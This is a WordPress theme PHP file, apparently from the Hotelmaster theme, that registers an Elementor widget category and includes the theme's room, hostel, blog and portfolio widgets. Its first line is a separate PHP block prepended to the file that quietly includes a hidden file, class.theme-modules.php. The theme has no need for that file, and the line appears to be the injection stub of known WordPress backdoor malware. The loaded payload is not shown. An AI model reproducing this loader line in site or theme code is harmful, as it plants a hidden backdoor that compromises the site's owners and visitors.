<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
	
	// add hotel master category
	add_action( 'elementor/elements/categories_registered', 'hotelmaster_add_elementor_widget_categories' );
	function hotelmaster_add_elementor_widget_categories( $elements_manager ) {
		$elements_manager->add_category(
			'hotelmaster',
			[
				'title' => __( 'Hotelmaster', 'plugin-name' ),
				'icon' => 'fa fa-home',
			]
		);

	}

	// include the widget
	add_action('init', 'hotelmaster_init_elementor');
	function hotelmaster_init_elementor(){
		if( !class_exists('\Elementor\Widget_Base') ) return;;
		
		include_once( 'blog.php' );
		include_once( 'image-list.php' );
		include_once( 'portfolio.php' );
		include_once( 'testimonial.php' );

		include_once( 'room-info.php' );

		include_once( 'room.php' );
		include_once( 'room-category.php' );
		include_once( 'room-availability.php' );
		include_once( 'room-reservation.php' );

		include_once( 'hostel-room.php' );
		include_once( 'hostel-room-category.php' );
		include_once( 'hostel-room-availability.php' );
		include_once( 'hostel-room-reservation.php' );
	}
	
	
